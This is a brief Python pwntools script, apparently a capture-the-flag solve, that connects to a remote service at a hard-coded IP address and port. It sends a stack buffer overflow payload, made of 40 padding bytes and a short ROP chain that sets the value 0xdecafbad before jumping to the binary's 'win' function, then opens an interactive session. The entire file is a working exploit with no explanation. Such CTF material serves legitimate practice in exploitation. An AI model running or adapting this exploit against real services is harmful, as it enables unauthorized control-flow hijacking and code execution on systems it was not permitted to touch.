# coding: utf-8
from pwn import *
pr = remote("207.154.239.148", 1338)
elf = ELF("./decaf64")
addr_1 = 0x04012e3
addr_2 = 0x040101a
payload = b''
payload += 40 * b'Z' + p64(addr_1) + p64(0xdecafbad) + p64(addr_2) + \
p64(elf.sym.win)
pr.sendline(payload)
pr.interactive()
